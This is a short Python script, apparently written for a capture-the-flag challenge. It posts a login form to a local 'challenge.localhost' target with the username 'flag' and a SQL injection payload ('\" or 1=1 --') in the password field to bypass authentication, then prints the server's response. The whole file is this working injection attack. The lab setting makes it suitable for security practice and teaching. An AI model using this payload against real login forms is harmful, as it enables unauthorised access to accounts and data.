import urllib.parse
import requests

method = "POST"
site = "http://challenge.localhost"
port = 80

url = f"{site}:{port}/"

# Set body data.
data = {"username": 'flag', "password": "\" or 1=1 --"}

# Set required headers.
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

response = requests.request(method, url, headers=headers, data=data)

print(f"\nResponse: {response.text}")
